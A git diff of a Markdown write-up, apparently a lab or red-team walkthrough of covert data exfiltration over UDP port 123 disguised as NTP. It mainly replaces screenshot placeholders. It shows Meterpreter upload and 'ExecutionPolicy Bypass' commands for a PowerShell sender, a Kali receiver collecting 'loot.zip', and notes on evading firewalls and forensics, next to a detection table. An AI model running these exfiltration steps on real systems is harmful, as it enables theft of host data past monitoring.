@@ -228,15 +228,6 @@ Standard network monitoring and DLP (Data Loss Prevention) solutions primarily i
 - **Port 123 universally trusted:** Firewalls rarely inspect NTP payload content or block outbound UDP 123.
 - **No external tools:** Both sender and receiver use only native libraries (Python `socket`, PowerShell `System.Net.Sockets.UdpClient`). So we don't leave forensic artifacts from third-party tools.
 
-<img width="449" height="73" alt="image" src="https://github.com/user-attachments/assets/d5df3463-262a-496c-a45f-b3f60f34d7ee" />
-
-
-<img width="300" height="242" alt="image" src="https://github.com/user-attachments/assets/b82b295c-828f-44ed-a70b-0bc13623d96c" />
-
-
-<img width="519" height="165" alt="image" src="https://github.com/user-attachments/assets/b5c537a0-b8a4-4b5c-835d-fb6e40f57227" />
-
-
 | Detection Vector | Description |
 |:---|:---|
 | **Process-to-port correlation** | Legitimate NTP traffic originates from `svchost.exe` (Windows Time Service). `powershell.exe` making outbound UDP 123 connections is anomalous to EDR tools. |
@@ -318,46 +309,42 @@ Stop System NTP to Free Port 123 (could use other port)
 
 Start Receiver on Kali
 ```sudo python3 /home/kali/loot/udp_receiver.py```
- 
 
  Upload Sender via Meterpreter (Run from meterpreter prompt)
 ```upload /home/kali/loot/udp_sender.ps1 C:\\temp\\udp_sender.ps1```
- 
+
+ <img width="829" height="72" alt="image" src="https://github.com/user-attachments/assets/e1cfde22-fb8f-47e3-95a0-f04ffd4cd07d" />
+
 Execute Sender on Windows
 ```
 shell
 powershell -ExecutionPolicy Bypass -File C:\temp\udp_sender.ps1
 ```
  
-*[Screenshot: PowerShell sender executing on Windows target]*
- 
+<img width="612" height="43" alt="image" src="https://github.com/user-attachments/assets/005bf3c9-c218-492f-8a4b-4a8f555cf4d9" />
+
 ---
+ Verification on C2
  
-## Verification on C2
- 
-### Archive Received
+Archive Received
 ```bash
 ls -lh /home/kali/loot/loot.zip
 ```
-*[Screenshot: loot.zip file listing with size]*
+<img width="449" height="73" alt="image" src="https://github.com/user-attachments/assets/d5df3463-262a-496c-a45f-b3f60f34d7ee" />
+
+Extraction
+```unzip loot.zip```
+
+<img width="300" height="242" alt="image" src="https://github.com/user-attachments/assets/b82b295c-828f-44ed-a70b-0bc13623d96c" />
  
-### Extraction
-```bash
-unzip loot.zip
-```
-*[Screenshot: unzip output showing all 12 files inflating]*
- 
-### File Listing After Extraction
-```bash
-ls
-```
-*[Screenshot: ls showing all extracted txt files]*
- 
-### File Integrity Verification
-```bash
-cat systeminfo.txt
-```
-*[Screenshot: systeminfo.txt output showing full Windows system information]*
+File Listing After Extraction
+
+<img width="1055" height="89" alt="image" src="https://github.com/user-attachments/assets/aa8db618-ece2-4b48-a435-7983b384da57" />
+
+File Integrity Verification
+```cat systeminfo.txt```
+
+<img width="519" height="165" alt="image" src="https://github.com/user-attachments/assets/b5c537a0-b8a4-4b5c-835d-fb6e40f57227" />
  
 **Key fields confirmed readable:**
 - Host Name: `DESKTOP-H53BPAA`
